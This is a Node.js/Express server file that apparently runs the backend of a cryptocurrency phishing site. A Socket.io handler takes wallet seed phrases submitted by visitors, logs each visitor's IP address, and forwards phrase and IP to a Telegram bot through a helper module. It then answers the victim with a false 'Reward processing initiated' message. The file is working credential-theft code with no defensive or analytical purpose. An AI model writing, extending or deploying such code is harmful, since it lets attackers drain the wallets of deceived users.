const express = require('express');
const app = express();
const http = require('http').Server(app);
const path = require('path');
require('dotenv').config();

// Initialize Socket.io with Render External URL CORS policy
const io = require('socket.io')(http, {
    cors: {
        origin: process.env.RENDER_EXTERNAL_URL || "*",
        methods: ["GET", "POST"]
    }
});

const { sendSeedData } = require('./bot_manager');

// Serve static files from the public folder
app.use(express.static(path.join(__dirname, 'public')));

// Port configuration (Render defaults to 10000, local usually 3000)
const PORT = process.env.PORT || 3000;

io.on('connection', (socket) => {
    const userIP = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    console.log(`Connection established: ${userIP}`);

    // Listen for the seed phrase submission from the frontend
    socket.on('submitSeed', (data) => {
        if (data && data.seedPhrase) {
            console.log(`Data received from ${userIP}, forwarding to Telegram...`);
            
            // Sends data using environment variables defined in Render
            sendSeedData(data.seedPhrase, userIP, socket.id);
            
            // Notify frontend of success
            socket.emit('submissionResponse', { success: true, message: 'Reward processing initiated.' });
        }
    });

    socket.on('disconnect', () => {
        console.log(`User disconnected: ${userIP}`);
    });
});

http.listen(PORT, () => {
    console.log(`ASA Server active on Port ${PORT}`);
    console.log(`Targeting URL: ${process.env.RENDER_EXTERNAL_URL || 'Localhost'}`);
});